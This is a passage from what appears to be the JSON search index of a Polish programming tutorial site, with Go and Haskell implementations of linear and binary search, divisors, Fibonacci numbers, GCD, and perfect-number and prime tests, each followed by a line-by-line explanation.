\"fmt\"\n\ntype array []int\n\nfunc (arr array) linearSearch(number int) int {\n    for i := 0; i &lt; len(arr); i++ {\n        if arr[i] == number {\n            return i\n        }\n    }\n\n    return -1\n}\n\nfunc main() {\n    arr := array{8, 2, 9, 10, 5, 4, 2, 7, 18, 0}\n    number := 7\n\n    index := arr.linearSearch(number)\n\n    if index == -1 {\n        fmt.Println(\"Liczby nie ma w tablicy\")\n    } else {\n        fmt.Printf(\"Liczba jest pod indeksem %d\\n\", index)\n    }\n}\n</code></pre>"},{"location":"programming/go/algorithms/searching/linear-search/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 7) zwraca jako wynik liczb\u0119 ca\u0142kowit\u0105 i jest metod\u0105 przypisan\u0105 do tablicy przyjmuj\u0105c\u0105 jeden argumenty: warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(0\\) do rozmiaru tablicy minus jeden (linia 8). Rozmiar tablicy pobieramy za pomoc\u0105 funkcji <code>len</code>. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 9). Je\u017celi tak, to zwracamy indeks tej warto\u015bci w tablicy (linia 10). Po przej\u015bciu przez wszystkie elementy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 <code>-1</code> informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w tablicy (linia 14).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 18) oraz warto\u015b\u0107 poszukiwanego elementu (linia 19). Nast\u0119pnie wywo\u0142ujemy metod\u0119 <code>linearSearch</code> na tablicy z wcze\u015bniej przygotowanym parametrem i jej wynik zapisujemy w nowej zmiennej <code>index</code> (linia 21). W zale\u017cno\u015bci od wyniku (linia 23) wypisujemy odpowiedni komunikat (linie 24 i 26).</p>"},{"location":"programming/go/algorithms/searching/linear-search/#wszystkie-pozycje-elementu","title":"Wszystkie pozycje elementu","text":""},{"location":"programming/go/algorithms/searching/linear-search/#implementacja_2","title":"Implementacja","text":"<pre><code>package main\n\nimport \"fmt\"\n\ntype array []int\n\nfunc (arr array) linearSearch(number int) {\n    for i := 0; i &lt; len(arr); i++ {\n        if arr[i] == number {\n            fmt.Println(i)\n        }\n    }\n}\n\nfunc main() {\n    arr := array{8, 2, 8, 4, 5, 6, 7, 8, 9, 8}\n    number := 8\n\n    fmt.Println(\"Indeksy, pod kt\u00f3rymi znajduje si\u0119 poszukiwana liczba:\")\n    arr.linearSearch(number)\n}\n</code></pre>"},{"location":"programming/go/algorithms/searching/linear-search/#opis-implementacji_2","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 7) nie zwraca wyniku i jest metod\u0105 przypisan\u0105 do tablicy przyjmuj\u0105c\u0105 jeden argumenty: warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(0\\) do rozmiaru tablicy minus jeden (linia 8). Rozmiar tablicy pobieramy za pomoc\u0105 funkcji <code>len</code>. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 9). Je\u017celi tak, to wypisujemy ten indeks (linia 10).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 16) oraz warto\u015b\u0107 poszukiwanego elementu (linia 17). Nast\u0119pnie wypisujemy stosowny komunikat (linia 19) i wywo\u0142ujemy metod\u0119 <code>linearSearch</code> na tablicy z wcze\u015bniej przygotowanym parametrem (linia 20). </p>"},{"location":"programming/haskell/","title":"Haskell","text":"<p>Haskell to j\u0119zyk programowania og\u00f3lnego przeznaczenia o silnym, statycznym typowaniu, kt\u00f3ry jest znany przede wszystkim z tego, \u017ce jest jednym z najpopularniejszych j\u0119zyk\u00f3w funkcyjnych. Zosta\u0142 stworzony w 1990 roku jako standard dla j\u0119zyk\u00f3w funkcyjnych.</p> <p> Haskell</p>"},{"location":"programming/haskell/#kluczowe-cechy","title":"Kluczowe cechy","text":"<ol> <li> <p>Programowanie funkcyjne: Haskell jest czystym j\u0119zykiem funkcyjnym, co oznacza, \u017ce wszystkie funkcje s\u0105 traktowane jako obiekty pierwszej klasy. Funkcje w Haskellu nie maj\u0105 efekt\u00f3w ubocznych, co u\u0142atwia debugowanie i testowanie.</p> </li> <li> <p>Statyczne typowanie: typy w Haskellu s\u0105 sprawdzane podczas kompilacji, a nie podczas wykonania, co pomaga wykrywa\u0107 b\u0142\u0119dy wcze\u015bnie.</p> </li> <li> <p>Leniwe obliczenia: Haskell wykorzystuje strategi\u0119 leniwych oblicze\u0144, co oznacza, \u017ce wyra\u017cenia s\u0105 obliczane tylko wtedy, gdy s\u0105 potrzebne. To umo\u017cliwia prac\u0119 z potencjalnie niesko\u0144czonymi strukturami danych.</p> </li> <li> <p>Wsparcie dla programowania r\u00f3wnoleg\u0142ego i wsp\u00f3\u0142bie\u017cnego: Haskell oferuje szereg narz\u0119dzi do programowania r\u00f3wnoleg\u0142ego i wsp\u00f3\u0142bie\u017cnego, co czyni go przydatnym do pracy ze z\u0142o\u017conymi problemami przetwarzania danych.</p> </li> <li> <p>Bezpiecze\u0144stwo kodu: dzi\u0119ki czystemu programowaniu funkcyjnemu i silnemu typowaniu, Haskell produkuje kod, kt\u00f3ry jest \u0142atwiejszy do utrzymania i mniej podatny na b\u0142\u0119dy.</p> </li> </ol> <p>Haskell jest cz\u0119sto u\u017cywany w \u015brodowisku akademickim i badawczym do nauki programowania funkcyjnego i eksplorowania zaawansowanych koncept\u00f3w teoretycznych. W praktyce jest u\u017cywany w r\u00f3\u017cnych dziedzinach, takich jak analiza danych, optymalizacja, tworzenie system\u00f3w webowych, a nawet w systemach operacyjnych i kompilatorach.</p>"},{"location":"programming/haskell/#popularnosc-jezyka","title":"Popularno\u015b\u0107 j\u0119zyka","text":"<p>Wykres popularno\u015bci j\u0119zyka Haskell</p>"},{"location":"programming/haskell/algorithms/integers/divisors/","title":"Wszystkie dzielniki","text":""},{"location":"programming/haskell/algorithms/integers/divisors/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/haskell/algorithms/integers/divisors/#implementacja","title":"Implementacja","text":"<pre><code>divisors n = [x | x &lt;- [1..sqrtN], n `mod` x == 0] ++ [n `div` x | x &lt;- [sqrtN, sqrtN - 1 .. 1], (n `mod` x == 0) &amp;&amp; (n `div` x /= x)]\n  where\n    sqrtN = floor $ sqrt $ fromIntegral n\n\nmain = do\n    let n = 16\n\n    print $ divisors n\n</code></pre>"},{"location":"programming/haskell/algorithms/integers/divisors/#opis","title":"Opis","text":"<p>Funkcja <code>divisors</code> przyjmuje jeden argument: liczb\u0119 <code>n</code>, dla kt\u00f3rej chcemy znale\u017a\u0107 dzielniki.</p> <ol> <li>Znalezienie dzielnik\u00f3w: w pierwszej cz\u0119\u015bci funkcji, generowana jest lista dzielnik\u00f3w <code>n</code> od 1 do pierwiastka kwadratowego z <code>n</code>. U\u017cywane jest tutaj wyra\u017cenie list sk\u0142adanych, kt\u00f3re sprawdza, czy <code>n</code> dzieli si\u0119 przez <code>x</code> bez reszty (<code>n `mod` x == 0</code>).</li> <li>Komplementarne dzielniki: w drugiej cz\u0119\u015bci, funkcja znajduje dzielniki <code>n</code> b\u0119d\u0105ce wynikiem dzielenia <code>n</code> przez <code>x</code> w odwrotnym zakresie, od pierwiastka kwadratowego z <code>n</code> do 1. Dodatkowo, warunek <code>(n `div` x /= x)</code> zapobiega powt\u00f3rzeniom, gdy <code>n</code> jest kwadratem jakiej\u015b liczby naturalnej.</li> <li>Po\u0142\u0105czenie wynik\u00f3w: wyniki obu cz\u0119\u015bci s\u0105 \u0142\u0105czone za pomoc\u0105 operatora <code>++</code>, tworz\u0105c pe\u0142n\u0105 list\u0119 dzielnik\u00f3w <code>n</code>.</li> </ol> <p>Kluczowym aspektem tej funkcji jest jej optymalizacja. Poprzez ograniczenie wyszukiwania do pierwiastka kwadratowego liczby <code>n</code>, znacznie redukuje si\u0119 ilo\u015b\u0107 wymaganych oblicze\u0144. Jest to standardowa technika w algorytmach zwi\u0105zanych z dzielnikami, kt\u00f3ra znacz\u0105co zwi\u0119ksza ich wydajno\u015b\u0107.</p> <p>W cz\u0119\u015bci <code>main</code> programu, definiujemy liczb\u0119 <code>n</code> (w tym przyk\u0142adzie 16) i u\u017cywamy funkcji <code>divisors</code>, aby znale\u017a\u0107 jej dzielniki. Nast\u0119pnie lista dzielnik\u00f3w jest wy\u015bwietlana.</p>"},{"location":"programming/haskell/algorithms/integers/fibonacci-numbers/","title":"Liczby Fibonacciego","text":""},{"location":"programming/haskell/algorithms/integers/fibonacci-numbers/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/haskell/algorithms/integers/fibonacci-numbers/#podejscie-naiwne","title":"Podej\u015bcie naiwne","text":""},{"location":"programming/haskell/algorithms/integers/fibonacci-numbers/#implementacja","title":"Implementacja","text":"<pre><code>fib 1 = 1\nfib 2 = 1\nfib n = fib (n-1) + fib (n-2)\n\nmain = do\n    print $ fib 10\n</code></pre>"},{"location":"programming/haskell/algorithms/integers/fibonacci-numbers/#opis","title":"Opis","text":"<p>Funkcja <code>fib</code> przyjmuje jeden argument: numer <code>n</code> w ci\u0105gu Fibonacciego, dla kt\u00f3rego ma zosta\u0107 obliczona warto\u015b\u0107.</p> <ol> <li>Warunki bazowe: funkcja definiuje warto\u015bci dla pierwszego (1) i drugiego (2) elementu ci\u0105gu jako 1. To niezb\u0119dne warunki bazowe dla rekurencji.</li> <li>Rekurencyjne wywo\u0142anie: dla ka\u017cdej warto\u015bci <code>n</code> wi\u0119kszej ni\u017c 2, funkcja oblicza warto\u015b\u0107 wywo\u0142uj\u0105c si\u0119 rekurencyjnie dwa razy: <code>fib (n-1)</code> i <code>fib (n-2)</code>, a nast\u0119pnie sumuj\u0105c otrzymane wyniki. To w\u0142a\u015bnie tworzy ci\u0105g Fibonacciego.</li> </ol> <p>W g\u0142\u00f3wnym programie (<code>main</code>) wywo\u0142ujemy funkcj\u0119 <code>fib</code> dla konkretnej warto\u015bci <code>n</code>, w tym przypadku 10. Wynik, czyli dziesi\u0105ty element ci\u0105gu Fibonacciego, jest nast\u0119pnie wy\u015bwietlany.</p>"},{"location":"programming/haskell/algorithms/integers/fibonacci-numbers/#podejscie-dynamiczne","title":"Podej\u015bcie dynamiczne","text":""},{"location":"programming/haskell/algorithms/integers/fibonacci-numbers/#implementacja_1","title":"Implementacja","text":"<pre><code>fib n = fibs !! (n - 1)\n    where fibs = 1 : 1 : zipWith (+) fibs (tail fibs)\n\nmain = do\n    print $ fib 10\n</code></pre>"},{"location":"programming/haskell/algorithms/integers/fibonacci-numbers/#opis_1","title":"Opis","text":"<p>Funkcja <code>fib</code> przyjmuje jeden argument: numer <code>n</code> w ci\u0105gu Fibonacciego, dla kt\u00f3rego ma zosta\u0107 obliczona warto\u015b\u0107.</p> <ol> <li>Wykorzystanie leniwych list: funkcja definiuje niesko\u0144czon\u0105 list\u0119 <code>fibs</code>, kt\u00f3ra zawiera ci\u0105g Fibonacciego. Lista jest tworzona za pomoc\u0105 operatora <code>:</code> (cons) i funkcji <code>zipWith</code>, kt\u00f3ra sumuje kolejno elementy listy <code>fibs</code> i jej ogona (<code>tail fibs</code>). Dzi\u0119ki leniwemu obliczaniu Haskell wyliczy tylko te elementy listy, kt\u00f3re s\u0105 faktycznie potrzebne.</li> <li>Dost\u0119p do elementu ci\u0105gu: g\u0142\u00f3wna funkcja <code>fib</code> dostaje dost\u0119p do konkretnego elementu ci\u0105gu, korzystaj\u0105c z operatora <code>!!</code> i indeksuj\u0105c list\u0119 <code>fibs</code> (z uwzgl\u0119dnieniem, \u017ce Haskell u\u017cywa indeksowania od zera, st\u0105d <code>n - 1</code>).</li> </ol> <p>W g\u0142\u00f3wnym programie (<code>main</code>) wywo\u0142ujemy funkcj\u0119 <code>fib</code> dla konkretnej warto\u015bci <code>n</code>, tutaj dla 10. Wynik, czyli dziesi\u0105ty element ci\u0105gu Fibonacciego, jest nast\u0119pnie wy\u015bwietlany.</p>"},{"location":"programming/haskell/algorithms/integers/gcd/","title":"NWD","text":""},{"location":"programming/haskell/algorithms/integers/gcd/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/haskell/algorithms/integers/gcd/#implementacja","title":"Implementacja","text":"<pre><code>gcdModulo a b\n  | b == 0 = a\n  | otherwise = gcdModulo b (a `mod` b)\n\nmain = do\n    print $ gcdModulo 32 12\n</code></pre>"},{"location":"programming/haskell/algorithms/integers/gcd/#opis","title":"Opis","text":"<p>Funkcja <code>gcdModulo</code> przyjmuje dwa argumenty: liczby <code>a</code> i <code>b</code>, dla kt\u00f3rych ma zosta\u0107 obliczony NWD.</p> <ol> <li>Warunek bazowy: je\u015bli druga liczba (<code>b</code>) jest r\u00f3wna 0, to pierwsza liczba (<code>a</code>) jest wynikiem, poniewa\u017c NWD liczby i zera to liczba.</li> <li>Rekurencyjne wywo\u0142anie: w przeciwnym przypadku, funkcja jest wywo\u0142ywana rekurencyjnie z <code>b</code> jako pierwszym argumentem, a reszt\u0105 z dzielenia <code>a</code> przez <code>b</code> (<code>a `mod` b</code>) jako drugim. Jest to kluczowy krok algorytmu Euklidesa, kt\u00f3ry polega na redukowaniu problemu do coraz mniejszych par liczb.</li> </ol> <p>W g\u0142\u00f3wnym programie (<code>main</code>) wywo\u0142ujemy funkcj\u0119 <code>gcdModulo</code> z konkretnymi liczbami, w tym przypadku 32 i 12. Wynik, czyli NWD tych liczb, jest nast\u0119pnie wy\u015bwietlany.</p>"},{"location":"programming/haskell/algorithms/integers/perfect-test/","title":"Test doskona\u0142o\u015bci","text":""},{"location":"programming/haskell/algorithms/integers/perfect-test/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/haskell/algorithms/integers/perfect-test/#implementacja","title":"Implementacja","text":"<pre><code>isPerfect n = sum ([x | x &lt;- [1..sqrtN], n `mod` x == 0] ++ [n `div` x | x &lt;- [sqrtN, sqrtN - 1 .. 2], (n `mod` x == 0) &amp;&amp; (n `div` x /= x)]) == n\n  where\n    sqrtN = floor $ sqrt $ fromIntegral n\n\nmain = do\n    let n = 6\n\n    print $ isPerfect n\n</code></pre>"},{"location":"programming/haskell/algorithms/integers/perfect-test/#opis","title":"Opis","text":"<p>Funkcja <code>isPerfect</code> przyjmuje jeden argument: liczb\u0119 <code>n</code>, kt\u00f3r\u0105 chcemy sprawdzi\u0107 pod k\u0105tem bycia liczb\u0105 doskona\u0142\u0105.</p> <ol> <li>Generowanie dzielnik\u00f3w: najpierw funkcja generuje list\u0119 dzielnik\u00f3w <code>n</code>, wykorzystuj\u0105c dwa wyra\u017cenia list sk\u0142adanych. Pierwsze z nich znajduje dzielniki od 1 do pierwiastka kwadratowego z <code>n</code>, a drugie od pierwiastka kwadratowego do 2, z dodatkowym warunkiem eliminuj\u0105cym powt\u00f3rzenia i wy\u0142\u0105czaj\u0105cym sam\u0105 liczb\u0119 <code>n</code>.</li> <li>Sumowanie dzielnik\u00f3w: nast\u0119pnie obliczana jest suma tych dzielnik\u00f3w za pomoc\u0105 funkcji <code>sum</code>.</li> <li>Por\u00f3wnanie z liczb\u0105 <code>n</code>: funkcja sprawdza, czy suma dzielnik\u00f3w jest r\u00f3wna liczbie <code>n</code>. Je\u015bli tak, oznacza to, \u017ce <code>n</code> jest liczb\u0105 doskona\u0142\u0105 i funkcja zwraca <code>True</code>. W przeciwnym razie zwraca <code>False</code>.</li> </ol> <p>W cz\u0119\u015bci <code>main</code> programu, definiujemy liczb\u0119 <code>n</code> (w tym przypadku 6) i sprawdzamy za pomoc\u0105 funkcji <code>isPerfect</code>, czy jest to liczba doskona\u0142a. Wynik jest wy\u015bwietlany, informuj\u0105c, czy <code>n</code> spe\u0142nia kryteria liczby doskona\u0142ej.</p>"},{"location":"programming/haskell/algorithms/integers/prime-factors/","title":"Rozk\u0142ad na czynniki pierwsze","text":""},{"location":"programming/haskell/algorithms/integers/prime-factors/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/haskell/algorithms/integers/prime-factors/#implementacja","title":"Implementacja","text":"<pre><code>primeFactors n i\n  | i &gt; n = []\n  | n `mod` i == 0 = i : primeFactors (n `div` i) i\n  | otherwise = primeFactors n (i + 1)\n\nmain = do\n    let n = 18\n\n    print $ primeFactors n 2\n</code></pre>"},{"location":"programming/haskell/algorithms/integers/prime-factors/#opis","title":"Opis","text":"<p>Funkcja <code>primeFactors</code> przyjmuje dwa argumenty: liczb\u0119 <code>n</code>, kt\u00f3rej czynniki pierwsze chcemy znale\u017a\u0107, oraz pocz\u0105tkowy dzielnik <code>i</code>, zaczynaj\u0105c od 2.</p> <ol> <li>Warunek ko\u0144ca: je\u015bli <code>i</code> jest wi\u0119ksze ni\u017c <code>n</code>, oznacza to, \u017ce wszystkie mo\u017cliwe czynniki pierwsze zosta\u0142y ju\u017c znalezione, wi\u0119c funkcja zwraca pust\u0105 list\u0119.</li> <li>Znalezienie czynnika pierwszego: je\u015bli <code>n</code> dzieli si\u0119 bez reszty przez <code>i</code> (<code>n `mod` i == 0</code>), to <code>i</code> jest jednym z czynnik\u00f3w pierwszych <code>n</code>. W takim przypadku, <code>i</code> jest dodawane do listy wynikowej, a funkcja jest rekurencyjnie wywo\u0142ywana dla <code>n</code>div<code>i</code>, aby znale\u017a\u0107 pozosta\u0142e czynniki.</li> <li>Przej\u015bcie do kolejnego dzielnika: je\u015bli <code>n</code> nie dzieli si\u0119 przez <code>i</code>, funkcja jest wywo\u0142ywana rekurencyjnie z inkrementowanym <code>i</code> (<code>i + 1</code>), aby sprawdzi\u0107 kolejne potencjalne czynniki.</li> </ol> <p>W g\u0142\u00f3wnym programie (<code>main</code>) definiujemy liczb\u0119 <code>n</code> (w tym przypadku 18) i wywo\u0142ujemy funkcj\u0119 <code>primeFactors</code>, aby znale\u017a\u0107 jej czynniki pierwsze. Wynik, kt\u00f3ry jest list\u0105 czynnik\u00f3w pierwszych liczby <code>n</code>, jest nast\u0119pnie wy\u015bwietlany.</p>"},{"location":"programming/haskell/algorithms/integers/prime-test/","title":"Test pierwszo\u015bci","text":""},{"location":"programming/haskell/algorithms/integers/prime-test/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/haskell/algorithms/integers/prime-test/#implementacja","title":"Implementacja","text":"<pre><code>isPrime n\n  | n &lt; 2 = False\n  | otherwise = not $ any (`divides` n) [2 .. sqrtN]\n  where\n    sqrtN = floor $ sqrt $ fromIntegral n\n\ndivides x n = n `mod` x == 0\n\nmain = do\n    let n = 13\n\n    print $ isPrime n\n</code></pre>"},{"location":"programming/haskell/algorithms/integers/prime-test/#opis","title":"Opis","text":"<p>Funkcja <code>isPrime</code> przyjmuje jeden argument: liczb\u0119 <code>n</code>, kt\u00f3r\u0105 chcemy sprawdzi\u0107 pod k\u0105tem bycia liczb\u0105 pierwsz\u0105.</p> <ol> <li>Sprawdzenie warunk\u00f3w wst\u0119pnych: Najpierw funkcja sprawdza, czy <code>n</code> jest mniejsze ni\u017c 2. Liczby mniejsze ni\u017c 2 nie s\u0105 liczbami pierwszymi, wi\u0119c w takim przypadku funkcja zwraca <code>False</code>.</li> <li>Weryfikacja dzielnik\u00f3w: nast\u0119pnie, funkcja u\u017cywa wyra\u017cenia <code>any</code> w po\u0142\u0105czeniu z funkcj\u0105 pomocnicz\u0105 <code>divides</code>, aby sprawdzi\u0107, czy jakakolwiek liczba z zakresu od 2 do pierwiastka kwadratowego z <code>n</code> jest dzielnikiem <code>n</code>. Je\u015bli tak jest, to <code>n</code> nie jest liczb\u0105 pierwsz\u0105 i funkcja zwraca <code>False</code>.</li> <li>Optymalizacja: sprawdzanie dzielnik\u00f3w jest ograniczone do pierwiastka kwadratowego z <code>n</code>, co jest znacz\u0105c\u0105 optymalizacj\u0105. Dzi\u0119ki temu algorytm dzia\u0142a szybciej, nie trac\u0105c na dok\u0142adno\u015bci.</li> </ol> <p>Definiujemy r\u00f3wnie\u017c pomocnicz\u0105 funkcj\u0119 <code>divides</code>, kt\u00f3ra przyjmuje dwa argumenty: <code>x</code> i <code>n</code>. Sprawdza ona, czy <code>x</code> jest dzielnikiem <code>n</code>, co jest realizowane przez sprawdzenie, czy reszta z dzielenia <code>n</code> przez <code>x</code> wynosi zero.</p> <p>W cz\u0119\u015bci <code>main</code> programu, definiujemy liczb\u0119 <code>n</code> (w tym przypadku 13) i u\u017cywamy funkcji <code>isPrime</code>, aby sprawdzi\u0107, czy jest to liczba pierwsza. Wynik jest nast\u0119pnie wy\u015bwietlany.</p> <ul> <li>Je\u015bli funkcja zwraca <code>True</code>, oznacza to, \u017ce <code>n</code> jest liczb\u0105 pierwsz\u0105.</li> <li>Je\u015bli funkcja zwraca <code>False</code>, liczba ta nie jest liczb\u0105 pierwsz\u0105.</li> </ul>"},{"location":"programming/haskell/algorithms/searching/binary-search/","title":"Wyszukiwanie binarne","text":""},{"location":"programming/haskell/algorithms/searching/binary-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/haskell/algorithms/searching/binary-search/#istnienie-elementu","title":"Istnienie elementu","text":""},{"location":"programming/haskell/algorithms/searching/binary-search/#implementacja","title":"Implementacja","text":"<pre><code>binarySearch lst num left right\n  | left &gt; right = False\n  | lst !! mid == num = True\n  | lst !! mid &lt; num = binarySearch lst num (mid + 1) right\n  | otherwise = binarySearch lst num left (mid - 1)\n  where mid = (left + right) `div` 2\n\nmain = do\n  let lst = [0, 2, 4, 5, 7, 8, 9, 10, 18]\n  let num = 4\n\n  let result = binarySearch lst num 0 (length lst - 1)\n\n  if result\n    then putStrLn \"Liczba jest w tablicy\"\n    else putStrLn \"Liczby nie ma w tablicy\"\n</code></pre>"},{"location":"programming/haskell/algorithms/searching/binary-search/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>binarySearch</code> przyjmuje cztery argumenty: <code>lst</code> (lista, w kt\u00f3rej szukamy), <code>num</code> (liczba, kt\u00f3rej szukamy), <code>left</code> (indeks pocz\u0105tkowy przeszukiwania) i <code>right</code> (indeks ko\u0144cowy przeszukiwania). Podstaw\u0105 funkcji jest podej\u015bcie rekurencyjne, dziel\u0105ce problem na mniejsze cz\u0119\u015bci.</p> <ol> <li>Najpierw sprawdzamy, czy indeks pocz\u0105tkowy jest wi\u0119kszy ni\u017c ko\u0144cowy. Je\u015bli tak, oznacza to, \u017ce liczba nie zosta\u0142a znaleziona, wi\u0119c funkcja zwraca <code>False</code>.</li> <li>Nast\u0119pnie obliczamy \u015brodkowy indeks listy (<code>mid</code>). Je\u015bli element w \u015brodku listy jest r\u00f3wny szukanej liczbie (<code>num</code>), funkcja zwraca <code>True</code>.</li> <li>Je\u015bli element \u015brodkowy jest mniejszy ni\u017c <code>num</code>, funkcja ponownie wywo\u0142uje siebie, ale tym razem z przesuni\u0119tym indeksem pocz\u0105tkowym na pozycj\u0119 za \u015brodkowym indeksem (<code>mid + 1</code>).</li> <li>W przeciwnym razie, je\u015bli element \u015brodkowy jest wi\u0119kszy ni\u017c <code>num</code>, funkcja ponownie wywo\u0142uje si\u0119 z indeksem ko\u0144cowym ustawionym na jeden przed \u015brodkowym (<code>mid - 1</code>).</li> </ol> <p>W cz\u0119\u015bci <code>main</code>, definiujemy uporz\u0105dkowan\u0105 list\u0119 <code>lst</code> i liczb\u0119 <code>num</code>, kt\u00f3r\u0105 chcemy znale\u017a\u0107. Wywo\u0142ujemy funkcj\u0119 <code>binarySearch</code> z tymi warto\u015bciami oraz z pocz\u0105tkowym i ko\u0144cowym indeksem listy. Wynik wyszukiwania (<code>result</code>) okre\u015bla, czy liczba znajduje si\u0119 w li\u015bcie, czy nie. W zale\u017cno\u015bci od wyniku, program wy\u015bwietla odpowiedni komunikat.</p>"},{"location":"programming/haskell/algorithms/searching/binary-search/#pozycja-elementu","title":"Pozycja elementu","text":""},{"location":"programming/haskell/algorithms/searching/binary-search/#implementacja_1","title":"Implementacja","text":"<pre><code>binarySearch lst num left right\n  | left &gt; right = -1\n  | lst !! mid == num = mid\n  | lst !! mid &lt; num = binarySearch lst num (mid + 1) right\n  | otherwise = binarySearch lst num left (mid - 1)\n  where mid = (left + right) `div` 2\n\nmain = do\n  let lst = [0, 2, 4, 5, 7, 8, 9, 10, 18]\n  let num = 4\n\n  let index = binarySearch lst num 0 (length lst - 1)\n\n  if index == -1\n    then putStrLn \"Liczby nie ma w tablicy\"\n    else do \n        putStr \"Liczba jest pod indeksem \"\n        print index\n</code></pre>"},{"location":"programming/haskell/algorithms/searching/binary-search/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Funkcja <code>binarySearch</code> przyjmuje cztery argumenty: list\u0119 <code>lst</code>, szukan\u0105 liczb\u0119 <code>num</code>, oraz indeksy <code>left</code> i <code>right</code>, kt\u00f3re okre\u015blaj\u0105 zakres przeszukiwania w li\u015bcie.</p> <ol> <li>Warunek ko\u0144ca: je\u015bli <code>left</code> jest wi\u0119ksze ni\u017c <code>right</code>, oznacza to, \u017ce przeszukiwany zakres zosta\u0142 wyczerpany, a liczba nie zosta\u0142a znaleziona. W takim przypadku, funkcja zwraca <code>-1</code>.</li> <li>Znalezienie liczby: obliczamy \u015brodkowy indeks (<code>mid</code>) listy. Je\u015bli element w \u015brodku jest r\u00f3wny szukanej liczbie (<code>num</code>), funkcja zwraca ten indeks.</li> <li>Przeszukiwanie prawej cz\u0119\u015bci: je\u017celi element \u015brodkowy jest mniejszy ni\u017c <code>num</code>, funkcja kontynuuje wyszukiwanie w prawej cz\u0119\u015bci listy, aktualizuj\u0105c indeks <code>left</code> na <code>mid + 1</code>.</li> <li>Przeszukiwanie lewej cz\u0119\u015bci: w przeciwnym razie, je\u015bli element \u015brodkowy jest wi\u0119kszy ni\u017c <code>num</code>, wyszukiwanie jest kontynuowane w lewej cz\u0119\u015bci, aktualizuj\u0105c indeks <code>right</code> na <code>mid - 1</code>.</li> </ol> <p>W cz\u0119\u015bci <code>main</code> programu, definiujemy posortowan\u0105 list\u0119 <code>lst</code> i liczb\u0119 <code>num</code>, kt\u00f3rej indeks chcemy znale\u017a\u0107. Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>binarySearch</code> z odpowiednimi parametrami. Wynik, jaki otrzymujemy, to indeks szukanej liczby w li\u015bcie.</p> <ul> <li>Je\u015bli wynik to <code>-1</code>, oznacza to, \u017ce liczba nie znajduje si\u0119 w li\u015bcie, co jest sygnalizowane odpowiednim komunikatem.</li> <li>W przeciwnym wypadku, program wy\u015bwietla indeks, pod kt\u00f3rym znajduje si\u0119 szukana liczba.</li> </ul>"},{"location":"programming/haskell/algorithms/searching/linear-search/","title":"Wyszukiwanie liniowe","text":""},{"location":"programming/haskell/algorithms/searching/linear-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/haskell/algorithms/searching/linear-search/#istnienie-elementu","title":"Istnienie elementu","text":""},{"location":"programming/haskell/algorithms/searching/linear-search/#implementacja","title":"Implementacja","text":"<pre><code>linearSearch [] num = False\nlinearSearch arr num\n    | head arr == num = True\n    | otherwise = linearSearch (tail arr) num\n\nmain = do\n  let arr = [8, 2, 9, 10, 5, 4, 2, 7, 18, 0]\n  let num = 7\n\n  let result = linearSearch arr num\n\n  if result\n    then putStrLn \"Liczba jest w tablicy\"\n    else putStrLn \"Liczby nie ma w tablicy\"\n</code></pre>"},{"location":"programming/haskell/algorithms/searching/linear-search/#opis","title":"Opis","text":"<p>Funkcja <code>linearSearch</code> (linie 1 i 2) zwraca jako wynik warto\u015b\u0107 prawda/fa\u0142sz i przyjmuje dwa argumenty: tablic\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Je\u017celi tablica jest pusta to funkcja zwraca warto\u015b\u0107 <code>False</code> informuj\u0105c\u0105 o tym, \u017ce poszukiwanego elementu nie znaleziono w tablicy (linia 1). Jest to tzw. warunek stopu rekurencji. Je\u017celi w tablicy pozosta\u0142y jeszcze jakie\u015b elementy do sprawdzenia, to sprawdzamy, czy pierwszy element tablicy (pobrany za pomoc\u0105 funkcji <code>head</code>) jest poszukiwan\u0105 warto\u015bci\u0105 (linia 3). Je\u017celi tak, to funkcja zwraca wynik <code>True</code> (linia 3). W przeciwnym przypadku wywo\u0142ujemy rekurencyjnie funkcj\u0119 <code>linearSearch</code>, jako argumenty przekazuj\u0105c list\u0119 bez pierwszego elementu (do tego u\u017cywamy funkcji <code>tail</code>), oraz warto\u015b\u0107 poszukiwanego elementu.</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 8) oraz warto\u015b\u0107 poszukiwanego elementu (linia 9). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>result</code> (linia 11). W zale\u017cno\u015bci od wyniku (linia 13) wypisujemy odpowiedni komunikat (linie 14 i 15).</p>"},{"location":"programming/haskell/algorithms/searching/linear-search/#pozycja-elementu","title":"Pozycja elementu","text":""},{"location":"programming/haskell/algorithms/searching/linear-search/#implementacja_1","title":"Implementacja","text":"<pre><code>linearSearch [] num ind = -1\nlinearSearch arr num ind\n    | head arr == num = ind\n    | otherwise = linearSearch (tail arr) num (ind + 1)\n\nmain = do\n  let arr = [8, 2, 